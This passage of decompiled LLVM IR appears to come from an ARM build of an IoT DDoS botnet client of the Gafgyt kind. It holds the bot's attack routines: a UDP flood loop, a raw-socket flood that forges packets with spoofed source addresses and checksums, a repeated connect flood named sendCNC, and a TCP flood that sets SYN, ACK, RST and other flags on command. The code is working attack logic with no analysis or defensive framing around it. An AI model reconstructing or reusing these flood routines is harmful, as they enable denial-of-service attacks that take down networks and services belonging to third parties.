dec_label_pc_10210:                               ; preds = %dec_label_pc_101e4
  store i32 17, i32* @r2, align 4
  %v3_1021c = call i32 @socket(i32 2, i32 2, i32 17)
  %v2_1022c = icmp eq i32 %v3_1021c, 0
  br i1 %v2_1022c, label %dec_label_pc_10234, label %dec_label_pc_1024c

dec_label_pc_10234:                               ; preds = %dec_label_pc_10210
  %v2_10238 = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_10244 = call i32 @HackerPrint(i32 %v2_10238, i32 ptrtoint ([27 x i8]* @global_var_22798.739 to i32))
  br label %dec_label_pc_10724

dec_label_pc_1024c:                               ; preds = %dec_label_pc_10210
  %v3_1024c = load i32, i32* %stack_var_0, align 4
  %v1_10250 = add i32 %v3_1024c, 1
  %v1_10258 = call i32 @malloc(i32 %v1_10250)
  %v2_10268 = icmp eq i32 %v1_10258, 0
  br i1 %v2_10268, label %dec_label_pc_10724, label %dec_label_pc_10270

dec_label_pc_10270:                               ; preds = %dec_label_pc_1024c
  %v3_10270 = load i32, i32* %stack_var_0, align 4
  %v1_10274 = add i32 %v3_10270, 1
  store i32 %v1_10274, i32* @r2, align 4
  %v2_10284 = inttoptr i32 %v1_10258 to i8*
  %v3_10284 = call i32 @__GI_memset(i8* %v2_10284, i32 0)
  %v2_10290 = call i32 @makeRandomStr(i32 %v1_10258, i32 %v3_10270)
  %v2_10298 = call i32 @__GI_time(i32* null)
  store i32 %v2_10298, i32* %r2.global-to-local, align 4
  %v2_102a4 = add i32 %v2_10298, %arg3
  %v2_102b8 = ptrtoint i32* %stack_var_-80 to i32
  br label %dec_label_pc_102b4

dec_label_pc_102b4:                               ; preds = %dec_label_pc_10330, %dec_label_pc_10324, %dec_label_pc_10270
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_10270 ], [ 0, %dec_label_pc_10324 ], [ %v1_10334, %dec_label_pc_10330 ]
  %v3_102b4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_102b4, i32* %r2.global-to-local, align 4
  %v6_102d8 = call i32 @__libc_sendto(i32 %v3_1021c, i32 %v1_10258, i32 %v3_102b4, i32 0, i32 %v2_102b8, i32 16)
  store i32 %stack_var_-112.0, i32* %r2.global-to-local, align 4
  %v9_102e4 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_102e4, label %dec_label_pc_102ec, label %dec_label_pc_10330

dec_label_pc_102ec:                               ; preds = %dec_label_pc_102b4
  br i1 %v2_10188, label %dec_label_pc_102f8, label %dec_label_pc_1030c

dec_label_pc_102f8:                               ; preds = %dec_label_pc_102ec
  %v0_102f8 = call i32 @rand_cmwc()
  br label %dec_label_pc_1030c

dec_label_pc_1030c:                               ; preds = %dec_label_pc_102ec, %dec_label_pc_102f8
  %v2_10310 = call i32 @__GI_time(i32* null)
  store i32 %v2_10310, i32* %r2.global-to-local, align 4
  %v8_10320 = icmp sgt i32 %v2_10310, %v2_102a4
  br i1 %v8_10320, label %dec_label_pc_10724, label %dec_label_pc_10324

dec_label_pc_10324:                               ; preds = %dec_label_pc_1030c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_102b4

dec_label_pc_10330:                               ; preds = %dec_label_pc_102b4
  %v1_10334 = add i32 %stack_var_-112.0, 1
  br label %dec_label_pc_102b4

dec_label_pc_10340:                               ; preds = %dec_label_pc_101e4
  store i32 17, i32* @r2, align 4
  %v3_10354 = call i32 @socket(i32 2, i32 3, i32 17)
  %v2_10364 = icmp eq i32 %v3_10354, 0
  br i1 %v2_10364, label %dec_label_pc_1036c, label %dec_label_pc_10384

dec_label_pc_1036c:                               ; preds = %dec_label_pc_10340
  %v2_10370 = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_1037c = call i32 @HackerPrint(i32 %v2_10370, i32 ptrtoint ([27 x i8]* @global_var_22798.739 to i32))
  br label %dec_label_pc_10720

dec_label_pc_10384:                               ; preds = %dec_label_pc_10340
  store i32 1, i32* %stack_var_-84, align 4
  %v2_1038c = ptrtoint i32* %stack_var_-84 to i32
  store i32 3, i32* @r2, align 4
  %v5_103a8 = call i32 @__GI_setsockopt(i32 %v3_10354, i32 0, i32 3, i32 %v2_1038c, i32 4)
  %v1_103b0 = icmp slt i32 %v5_103a8, 0
  br i1 %v1_103b0, label %dec_label_pc_103b8, label %dec_label_pc_103d0

dec_label_pc_103b8:                               ; preds = %dec_label_pc_10384
  %v2_103bc = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_103c8 = call i32 @HackerPrint(i32 %v2_103bc, i32 ptrtoint ([33 x i8]* @global_var_227b4.741 to i32))
  br label %dec_label_pc_10720

dec_label_pc_103d0:                               ; preds = %dec_label_pc_10384
  br label %dec_label_pc_103dc

dec_label_pc_103dc:                               ; preds = %dec_label_pc_103d0, %dec_label_pc_103dc
  %v1_1041421 = phi i32 [ 49, %dec_label_pc_103d0 ], [ %v1_10414, %dec_label_pc_103dc ]
  %v2_103e0 = call i32 @__GI_time(i32* null)
  store i32 %v2_103e0, i32* @r4, align 4
  %v0_103ec = call i32 @rand_cmwc()
  %v0_103f4 = load i32, i32* @r4, align 4
  %v2_103f4 = xor i32 %v0_103f4, %v0_103ec
  %v1_103fc = call i32 @srand(i32 %v2_103f4)
  %v0_10400 = call i32 @rand()
  %v1_1040c = call i32 @init_rand(i32 %v0_10400)
  %v1_10414 = add nsw i32 %v1_1041421, -1
  %v3_10420 = icmp eq i32 %v1_1041421, 0
  br i1 %v3_10420, label %dec_label_pc_10428, label %dec_label_pc_103dc

dec_label_pc_10428:                               ; preds = %dec_label_pc_103dc
  %v2_1042c = icmp eq i32 %arg4, 0
  br i1 %v2_1042c, label %dec_label_pc_10458, label %dec_label_pc_10440

dec_label_pc_10440:                               ; preds = %dec_label_pc_10428
  %v1_10444 = sub i32 32, %arg4
  store i32 %v1_10444, i32* %r2.global-to-local, align 4
  %v1_10450 = shl i32 -1, %v1_10444
  br label %dec_label_pc_10458

dec_label_pc_10458:                               ; preds = %dec_label_pc_10428, %dec_label_pc_10440
  %storemerge10 = phi i32 [ %v1_10450, %dec_label_pc_10440 ], [ 0, %dec_label_pc_10428 ]
  %v3_10458 = load i32, i32* %stack_var_0, align 4
  %v1_1045c = add i32 %v3_10458, 28
  %v1_1046c = add i32 %v3_10458, 42
  %v3_10470 = and i32 %v1_1046c, -8
  %v1_10478 = load i32, i32* @sp, align 4
  %v2_10478 = sub i32 %v1_10478, %v3_10470
  %v1_1047c = add i32 %v2_10478, 8
  store i32 %v1_1047c, i32* %r2.global-to-local, align 4
  %v1_10488 = add i32 %v2_10478, 15
  %v3_1048c = and i32 %v1_10488, -8
  %v1_104ac = add i32 %v3_1048c, 20
  %v5_104b0 = inttoptr i32 %v1_104ac to i16*
  %v3_104b4 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_104b4, i32* @r4, align 4
  %v1_104bc = call i32 @HackerScan2(i32 %storemerge10)
  %v1_104c8 = call i32 @__GI_htonl(i32 %v1_104bc)
  store i32 %v1_104c8, i32* %r2.global-to-local, align 4
  %v3_104d0 = load i32, i32* %stack_var_0, align 4
  %v1_104d4 = add i32 %v3_104d0, 8
  %v1_104d8 = load i32, i32* @sp, align 4
  %v2_104d8 = inttoptr i32 %v1_104d8 to i32*
  store i32 %v1_104d4, i32* %v2_104d8, align 4
  %v0_104e0 = load i32, i32* @r4, align 4
  %v4_104e8 = inttoptr i32 %v3_1048c to i8*
  %v5_104e8 = call i32 @makeIPPacket(i8* %v4_104e8, i32 %v0_104e0, i32 %v1_104c8, i32 17)
  %v3_104ec = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_104ec, 8
  %v3_10500 = urem i32 %fold, 65536
  %v1_10508 = call i32 @__GI_htons(i32 %v3_10500)
  %sext = mul i32 %v1_10508, 65536
  %v1_1050c = sdiv i32 %sext, 65536
  store i32 %v1_1050c, i32* %r2.global-to-local, align 4
  %v1_10518 = trunc i32 %v1_1050c to i16
  %v3_10518 = add i32 %v3_1048c, 24
  %v4_10518 = inttoptr i32 %v3_10518 to i16*
  store i16 %v1_10518, i16* %v4_10518, align 8
  %v0_1051c = call i32 @rand_cmwc()
  %v3_10528 = urem i32 %v0_1051c, 65536
  store i32 %v3_10528, i32* %r2.global-to-local, align 4
  %v1_10530 = trunc i32 %v0_1051c to i16
  store i16 %v1_10530, i16* %v5_104b0, align 4
  br i1 %v2_10188, label %dec_label_pc_10540, label %dec_label_pc_10558

dec_label_pc_10540:                               ; preds = %dec_label_pc_10458
  %v0_10540 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_10540 to i16
  br label %dec_label_pc_10574

dec_label_pc_10558:                               ; preds = %dec_label_pc_10458
  %v3_10560 = urem i32 %arg2, 65536
  %v1_10568 = call i32 @__GI_htons(i32 %v3_10560)
  %extract.t79 = trunc i32 %v1_10568 to i16
  br label %dec_label_pc_10574

dec_label_pc_10574:                               ; preds = %dec_label_pc_10540, %dec_label_pc_10558
  %v0_10540.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10540 ], [ %extract.t79, %dec_label_pc_10558 ]
  %v3_10658.pre-phi = phi i32 [ 0, %dec_label_pc_10540 ], [ %v3_10560, %dec_label_pc_10558 ]
  %v3_1057c = add i32 %v3_1048c, 22
  %v4_1057c = inttoptr i32 %v3_1057c to i16*
  store i16 %v0_10540.sink.off0, i16* %v4_1057c, align 2
  store i32 %v1_104ac, i32* %r2.global-to-local, align 4
  %v3_10588 = add i32 %v3_1048c, 26
  %v4_10588 = inttoptr i32 %v3_10588 to i16*
  store i16 0, i16* %v4_10588, align 2
  %v1_10590 = add i32 %v3_1048c, 28
  %v3_10598 = load i32, i32* %stack_var_0, align 4
  %v2_1059c = call i32 @makeRandomStr(i32 %v1_10590, i32 %v3_10598)
  store i32 %v3_1048c, i32* %r2.global-to-local, align 4
  %v1_105ac = or i32 %v3_1048c, 2
  %v2_105ac = inttoptr i32 %v1_105ac to i16*
  %v3_105ac = load i16, i16* %v2_105ac, align 2
  %v4_105ac = zext i16 %v3_105ac to i32
  %v2_105b8 = inttoptr i32 %v3_1048c to i16*
  %v3_105b8 = call i32 @csum(i16* %v2_105b8, i32 %v4_105ac)
  %sext4 = mul i32 %v3_105b8, 65536
  %v1_105bc = sdiv i32 %sext4, 65536
  store i32 %v1_105bc, i32* %r2.global-to-local, align 4
  %v1_105c8 = trunc i32 %v1_105bc to i16
  %v3_105c8 = add i32 %v3_1048c, 10
  %v4_105c8 = inttoptr i32 %v3_105c8 to i16*
  store i16 %v1_105c8, i16* %v4_105c8, align 2
  %v2_105d0 = call i32 @__GI_time(i32* null)
  store i32 %v2_105d0, i32* %r2.global-to-local, align 4
  %v2_105dc = add i32 %v2_105d0, %arg3
  %v2_105f0 = ptrtoint i32* %stack_var_-80 to i32
  %v3_1068c = or i32 %v3_1048c, 4
  %v4_1068c = inttoptr i32 %v3_1068c to i16*
  %v2_106ac = add i32 %v3_1048c, 12
  %v3_106ac = inttoptr i32 %v2_106ac to i32*
  br label %dec_label_pc_105ec

dec_label_pc_105ec:                               ; preds = %dec_label_pc_10710, %dec_label_pc_10704, %dec_label_pc_10574
  %stack_var_-108.0 = phi i32 [ 0, %dec_label_pc_10574 ], [ 0, %dec_label_pc_10704 ], [ %v1_10714, %dec_label_pc_10710 ]
  store i32 %v3_1048c, i32* %r2.global-to-local, align 4
  %v1_105f4 = load i32, i32* @sp, align 4
  %v2_105f4 = inttoptr i32 %v1_105f4 to i32*
  store i32 %v2_105f0, i32* %v2_105f4, align 4
  %v1_105fc = load i32, i32* @sp, align 4
  %v2_105fc = add i32 %v1_105fc, 4
  %v3_105fc = inttoptr i32 %v2_105fc to i32*
  store i32 16, i32* %v3_105fc, align 4
  %v0_10604 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1045c, i32* %r2.global-to-local, align 4
  %v6_10610 = call i32 @__libc_sendto(i32 %v3_10354, i32 %v0_10604, i32 %v1_1045c, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_10614 = call i32 @rand_cmwc()
  %v3_10620 = urem i32 %v0_10614, 65536
  store i32 %v3_10620, i32* %r2.global-to-local, align 4
  %v1_10628 = trunc i32 %v0_10614 to i16
  store i16 %v1_10628, i16* %v5_104b0, align 4
  br i1 %v2_10188, label %dec_label_pc_10638, label %dec_label_pc_10650

dec_label_pc_10638:                               ; preds = %dec_label_pc_105ec
  %v0_10638 = call i32 @rand_cmwc()
  %extract.t80 = trunc i32 %v0_10638 to i16
  br label %dec_label_pc_1066c

dec_label_pc_10650:                               ; preds = %dec_label_pc_105ec
  %v1_10660 = call i32 @__GI_htons(i32 %v3_10658.pre-phi)
  %extract.t81 = trunc i32 %v1_10660 to i16
  br label %dec_label_pc_1066c

dec_label_pc_1066c:                               ; preds = %dec_label_pc_10638, %dec_label_pc_10650
  %v0_10638.sink.off0 = phi i16 [ %extract.t80, %dec_label_pc_10638 ], [ %extract.t81, %dec_label_pc_10650 ]
  %v4_10670 = sext i16 %v0_10638.sink.off0 to i32
  store i32 %v4_10670, i32* %r2.global-to-local, align 4
  store i16 %v0_10638.sink.off0, i16* %v4_1057c, align 2
  %v0_10678 = call i32 @rand_cmwc()
  %v3_10684 = urem i32 %v0_10678, 65536
  store i32 %v3_10684, i32* %r2.global-to-local, align 4
  %v1_1068c = trunc i32 %v0_10678 to i16
  store i16 %v1_1068c, i16* %v4_1068c, align 4
  %v1_10694 = call i32 @HackerScan2(i32 %storemerge10)
  %v1_106a0 = call i32 @__GI_htonl(i32 %v1_10694)
  store i32 %v1_106a0, i32* %v3_106ac, align 4
  store i32 %v3_1048c, i32* %r2.global-to-local, align 4
  %v3_106bc = load i16, i16* %v2_105ac, align 2
  %v4_106bc = zext i16 %v3_106bc to i32
  %v3_106c8 = call i32 @csum(i16* %v2_105b8, i32 %v4_106bc)
  %v1_106d8 = trunc i32 %v3_106c8 to i16
  store i16 %v1_106d8, i16* %v4_105c8, align 2
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_106e4 = icmp eq i32 %stack_var_-108.0, %arg6
  br i1 %v9_106e4, label %dec_label_pc_106ec, label %dec_label_pc_10710

dec_label_pc_106ec:                               ; preds = %dec_label_pc_1066c
  %v2_106f0 = call i32 @__GI_time(i32* null)
  store i32 %v2_106f0, i32* %r2.global-to-local, align 4
  %v8_10700 = icmp sgt i32 %v2_106f0, %v2_105dc
  br i1 %v8_10700, label %dec_label_pc_10720, label %dec_label_pc_10704

dec_label_pc_10704:                               ; preds = %dec_label_pc_106ec
  br label %dec_label_pc_105ec

dec_label_pc_10710:                               ; preds = %dec_label_pc_1066c
  %v1_10714 = add i32 %stack_var_-108.0, 1
  store i32 %v1_10714, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_105ec

dec_label_pc_10720:                               ; preds = %dec_label_pc_106ec, %dec_label_pc_103b8, %dec_label_pc_1036c
  %v1_1072c26 = phi i32 [ %v3_103c8, %dec_label_pc_103b8 ], [ %v3_1037c, %dec_label_pc_1036c ], [ %v2_106f0, %dec_label_pc_106ec ]
  br label %dec_label_pc_10724

dec_label_pc_10724:                               ; preds = %dec_label_pc_1030c, %dec_label_pc_101c4, %dec_label_pc_1024c, %dec_label_pc_10234, %dec_label_pc_10720
  %v1_1072c = phi i32 [ %v3_101d4, %dec_label_pc_101c4 ], [ 0, %dec_label_pc_1024c ], [ %v3_10244, %dec_label_pc_10234 ], [ %v1_1072c26, %dec_label_pc_10720 ], [ %v2_10310, %dec_label_pc_1030c ]
  ret i32 %v1_1072c

; uselistorder directives
  uselistorder i32 %v1_10714, { 1, 0 }
  uselistorder i32 %v0_10678, { 1, 0 }
  uselistorder i16 %v0_10638.sink.off0, { 1, 0 }
  uselistorder i32 %v0_10614, { 1, 0 }
  uselistorder i32 %v1_105bc, { 1, 0 }
  uselistorder i32 %v3_10560, { 1, 0 }
  uselistorder i32 %v0_1051c, { 1, 0 }
  uselistorder i32 %v1_1050c, { 1, 0 }
  uselistorder i32 %v3_1048c, { 6, 4, 5, 12, 3, 13, 11, 2, 10, 9, 8, 7, 1, 0 }
  uselistorder i32 %v1_1045c, { 1, 0 }
  uselistorder i32 %v3_102b4, { 1, 0 }
  uselistorder i32 %stack_var_-112.0, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 26, { 1, 2, 0 }
  uselistorder i32 ()* @rand, { 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10724, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1066c, { 1, 0 }
  uselistorder label %dec_label_pc_10574, { 1, 0 }
  uselistorder label %dec_label_pc_10458, { 1, 0 }
  uselistorder label %dec_label_pc_103dc, { 1, 0 }
  uselistorder label %dec_label_pc_1030c, { 1, 0 }
  uselistorder label %dec_label_pc_101c4, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1075c = call i32 @__GI_time(i32* null)
  %v2_10768 = add i32 %v2_1075c, %arg3
  store i32 %arg1, i32* @r0, align 4
  %v1_10778 = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_10794 = urem i32 %arg2, 65536
  %v1_1079c = call i32 @__GI_htons(i32 %v3_10794)
  %v2_107c4 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_107e8

dec_label_pc_107ac:                               ; preds = %dec_label_pc_107e8
  %v3_107b8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_107d4 = call i32 @__libc_connect(i32 %v3_107b8, i32 %v2_107c4, i32 16)
  %v1_107dc = call i32 @sleep(i32 1)
  %v1_107e4 = call i32 @__GI_close(i32 %v3_107b8)
  br label %dec_label_pc_107e8

dec_label_pc_107e8:                               ; preds = %entry, %dec_label_pc_107ac
  %v2_107ec = call i32 @__GI_time(i32* null)
  %v5_107fc = icmp slt i32 %v2_107ec, %v2_10768
  br i1 %v5_107fc, label %dec_label_pc_107ac, label %dec_label_pc_10800

dec_label_pc_10800:                               ; preds = %dec_label_pc_107e8
  ret i32 %v2_107ec

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_107e8, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 67608, i32* %stack_var_-4, align 4
  %v2_10814 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10814, i32* @fp, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_10848 = icmp eq i32 %arg2, 0
  br i1 %v2_10848, label %dec_label_pc_10850, label %dec_label_pc_10868

dec_label_pc_10850:                               ; preds = %entry
  %v0_10850 = call i32 @rand_cmwc()
  br label %dec_label_pc_10884

dec_label_pc_10868:                               ; preds = %entry
  %v3_10870 = urem i32 %arg2, 65536
  %v1_10878 = call i32 @__GI_htons(i32 %v3_10870)
  br label %dec_label_pc_10884

dec_label_pc_10884:                               ; preds = %dec_label_pc_10850, %dec_label_pc_10868
  %v3_10894 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_1089c = icmp eq i32 %v3_10894, 0
  br i1 %v2_1089c, label %dec_label_pc_108a8, label %dec_label_pc_10ee4

dec_label_pc_108a8:                               ; preds = %dec_label_pc_10884
  store i32 8, i32* @r2, align 4
  %v2_108bc = bitcast i32* %stack_var_-60 to i8*
  %v3_108bc = call i32 @__GI_memset(i8* %v2_108bc, i32 0)
  store i32 6, i32* @r2, align 4
  %v3_108cc = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_108dc = icmp eq i32 %v3_108cc, 0
  br i1 %v2_108dc, label %dec_label_pc_108e4, label %dec_label_pc_108fc

dec_label_pc_108e4:                               ; preds = %dec_label_pc_108a8
  %v2_108e8 = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_108f4 = call i32 @HackerPrint(i32 %v2_108e8, i32 ptrtoint ([27 x i8]* @global_var_22798.739 to i32))
  br label %dec_label_pc_10ee4

dec_label_pc_108fc:                               ; preds = %dec_label_pc_108a8
  store i32 1, i32* %stack_var_-72, align 4
  %v2_10904 = ptrtoint i32* %stack_var_-72 to i32
  store i32 3, i32* @r2, align 4
  %v5_10920 = call i32 @__GI_setsockopt(i32 %v3_108cc, i32 0, i32 3, i32 %v2_10904, i32 4)
  %v1_10928 = icmp slt i32 %v5_10920, 0
  br i1 %v1_10928, label %dec_label_pc_10930, label %dec_label_pc_10948

dec_label_pc_10930:                               ; preds = %dec_label_pc_108fc
  %v2_10934 = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_10940 = call i32 @HackerPrint(i32 %v2_10934, i32 ptrtoint ([33 x i8]* @global_var_227b4.741 to i32))
  br label %dec_label_pc_10ee4

dec_label_pc_10948:                               ; preds = %dec_label_pc_108fc
  %v2_1094c = icmp eq i32 %arg4, 0
  br i1 %v2_1094c, label %dec_label_pc_10978, label %dec_label_pc_10960

dec_label_pc_10960:                               ; preds = %dec_label_pc_10948
  %v1_10964 = sub i32 32, %arg4
  store i32 %v1_10964, i32* %r2.global-to-local, align 4
  %v1_10970 = shl i32 -1, %v1_10964
  br label %dec_label_pc_10978

dec_label_pc_10978:                               ; preds = %dec_label_pc_10948, %dec_label_pc_10960
  %storemerge9 = phi i32 [ %v1_10970, %dec_label_pc_10960 ], [ 0, %dec_label_pc_10948 ]
  %v1_1097c = add i32 %arg6, 40
  %v1_1098c = add i32 %arg6, 54
  %v3_10990 = and i32 %v1_1098c, -8
  %v1_10998 = load i32, i32* @sp, align 4
  %v2_10998 = sub i32 %v1_10998, %v3_10990
  %v1_109a8 = add i32 %v2_10998, 15
  %v3_109ac = and i32 %v1_109a8, -8
  store i32 %v3_109ac, i32* %r2.global-to-local, align 4
  %v1_109cc = add i32 %v3_109ac, 20
  %v5_109d0 = inttoptr i32 %v1_109cc to i16*
  %v3_109d4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_109d4, i32* @r4, align 4
  %v1_109dc = call i32 @HackerScan2(i32 %storemerge9)
  %v1_109e8 = call i32 @__GI_htonl(i32 %v1_109dc)
  store i32 %v1_109e8, i32* %r2.global-to-local, align 4
  %v1_109f4 = add i32 %arg6, 20
  %v1_109f8 = load i32, i32* @sp, align 4
  %v2_109f8 = inttoptr i32 %v1_109f8 to i32*
  store i32 %v1_109f4, i32* %v2_109f8, align 4
  %v0_10a00 = load i32, i32* @r4, align 4
  %v4_10a08 = inttoptr i32 %v3_109ac to i8*
  %v5_10a08 = call i32 @makeIPPacket(i8* %v4_10a08, i32 %v0_10a00, i32 %v1_109e8, i32 6)
  %v0_10a0c = call i32 @rand_cmwc()
  %v3_10a18 = urem i32 %v0_10a0c, 65536
  store i32 %v3_10a18, i32* %r2.global-to-local, align 4
  %v1_10a20 = trunc i32 %v0_10a0c to i16
  store i16 %v1_10a20, i16* %v5_109d0, align 4
  %v0_10a24 = call i32 @rand_cmwc()
  %v2_10a30 = add i32 %v3_109ac, 24
  %v3_10a30 = inttoptr i32 %v2_10a30 to i32*
  store i32 %v0_10a24, i32* %v3_10a30, align 8
  %v2_10a3c = add i32 %v3_109ac, 28
  %v3_10a3c = inttoptr i32 %v2_10a3c to i32*
  store i32 0, i32* %v3_10a3c, align 4
  store i32 %v1_109cc, i32* %r2.global-to-local, align 4
  %v1_10a44 = add i32 %v3_109ac, 32
  %v2_10a44 = inttoptr i32 %v1_10a44 to i8*
  %v3_10a44 = load i8, i8* %v2_10a44, align 8
  %v1_10a50 = urem i8 %v3_10a44, 16
  %v1_10a54 = or i8 %v1_10a50, 80
  store i8 %v1_10a54, i8* %v2_10a44, align 8
  %v3_10a64 = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_227d8.746 to i32), i32* @r1, align 4
  %v3_10a70 = inttoptr i32 %v3_10a64 to i8*
  %v4_10a70 = call i32 @__GI_strcoll(i8* %v3_10a70, i32 ptrtoint ([4 x i8]* @global_var_227d8.746 to i32))
  %v2_10a78 = icmp eq i32 %v4_10a70, 0
  br i1 %v2_10a78, label %dec_label_pc_10a80, label %dec_label_pc_10b38

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10978
  store i32 %v1_109cc, i32* %r2.global-to-local, align 4
  %v1_10a84 = add i32 %v3_109ac, 33
  %v2_10a84 = inttoptr i32 %v1_10a84 to i8*
  %v3_10a84 = load i8, i8* %v2_10a84, align 1
  %v1_10a94 = or i8 %v3_10a84, 2
  store i8 %v1_10a94, i8* %v2_10a84, align 1
  store i32 %v1_109cc, i32* %r2.global-to-local, align 4
  %v3_10aa8 = load i8, i8* %v2_10a84, align 1
  %v1_10ab8 = or i8 %v3_10aa8, 4
  store i8 %v1_10ab8, i8* %v2_10a84, align 1
  store i32 %v1_109cc, i32* %r2.global-to-local, align 4
  %v3_10acc = load i8, i8* %v2_10a84, align 1
  %v1_10adc = or i8 %v3_10acc, 1
  store i8 %v1_10adc, i8* %v2_10a84, align 1
  store i32 %v1_109cc, i32* %r2.global-to-local, align 4
  %v3_10af0 = load i8, i8* %v2_10a84, align 1
  %v1_10b00 = or i8 %v3_10af0, 16
  store i8 %v1_10b00, i8* %v2_10a84, align 1
  store i32 %v1_109cc, i32* %r2.global-to-local, align 4
  %v3_10b14 = load i8, i8* %v2_10a84, align 1
  %v1_10b24 = or i8 %v3_10b14, 8
  store i8 %v1_10b24, i8* %v2_10a84, align 1
  br label %dec_label_pc_10ce0

dec_label_pc_10b38:                               ; preds = %dec_label_pc_10978
  %v3_10b38 = load i32, i32* %stack_var_0, align 4
  %v2_10b44 = call i32 @__GI_strtok(i32 %v3_10b38, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  %v2_10cd818 = icmp eq i32 %v2_10b44, 0
  br i1 %v2_10cd818, label %dec_label_pc_10ce0, label %dec_label_pc_10b54.lr.ph

dec_label_pc_10b54.lr.ph:                         ; preds = %dec_label_pc_10b38
  %v1_10b74 = add i32 %v3_109ac, 33
  %v2_10b74 = inttoptr i32 %v1_10b74 to i8*
  br label %dec_label_pc_10b54

dec_label_pc_10b54:                               ; preds = %dec_label_pc_10b54.lr.ph, %dec_label_pc_10cc0
  %storemerge1319 = phi i32 [ %v2_10b44, %dec_label_pc_10b54.lr.ph ], [ %v2_10cc8, %dec_label_pc_10cc0 ]
  store i32 ptrtoint ([4 x i8]* @global_var_227e0.750 to i32), i32* @r1, align 4
  %v3_10b60 = inttoptr i32 %storemerge1319 to i8*
  %v4_10b60 = call i32 @__GI_strcoll(i8* %v3_10b60, i32 ptrtoint ([4 x i8]* @global_var_227e0.750 to i32))
  %v2_10b68 = icmp eq i32 %v4_10b60, 0
  br i1 %v2_10b68, label %dec_label_pc_10b70, label %dec_label_pc_10b98

dec_label_pc_10b70:                               ; preds = %dec_label_pc_10b54
  %v3_10b74 = load i8, i8* %v2_10b74, align 1
  %v4_10b7c = zext i8 %v3_10b74 to i32
  %v1_10b84 = or i32 %v4_10b7c, 2
  store i32 %v1_10b84, i32* %r2.global-to-local, align 4
  %v1_10b90 = trunc i32 %v1_10b84 to i8
  store i8 %v1_10b90, i8* %v2_10b74, align 1
  br label %dec_label_pc_10cc0

dec_label_pc_10b98:                               ; preds = %dec_label_pc_10b54
  store i32 ptrtoint ([4 x i8]* @global_var_227e4.752 to i32), i32* @r1, align 4
  %v4_10ba4 = call i32 @__GI_strcoll(i8* %v3_10b60, i32 ptrtoint ([4 x i8]* @global_var_227e4.752 to i32))
  %v2_10bac = icmp eq i32 %v4_10ba4, 0
  br i1 %v2_10bac, label %dec_label_pc_10bb4, label %dec_label_pc_10bdc

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10b98
  %v3_10bb8 = load i8, i8* %v2_10b74, align 1
  %v4_10bc0 = zext i8 %v3_10bb8 to i32
  %v1_10bc8 = or i32 %v4_10bc0, 4
  store i32 %v1_10bc8, i32* %r2.global-to-local, align 4
  %v1_10bd4 = trunc i32 %v1_10bc8 to i8
  store i8 %v1_10bd4, i8* %v2_10b74, align 1
  br label %dec_label_pc_10cc0

dec_label_pc_10bdc:                               ; preds = %dec_label_pc_10b98
  store i32 ptrtoint ([4 x i8]* @global_var_227e8.754 to i32), i32* @r1, align 4
  %v4_10be8 = call i32 @__GI_strcoll(i8* %v3_10b60, i32 ptrtoint ([4 x i8]* @global_var_227e8.754 to i32))
  %v2_10bf0 = icmp eq i32 %v4_10be8, 0
  br i1 %v2_10bf0, label %dec_label_pc_10bf8, label %dec_label_pc_10c20

dec_label_pc_10bf8:                               ; preds = %dec_label_pc_10bdc
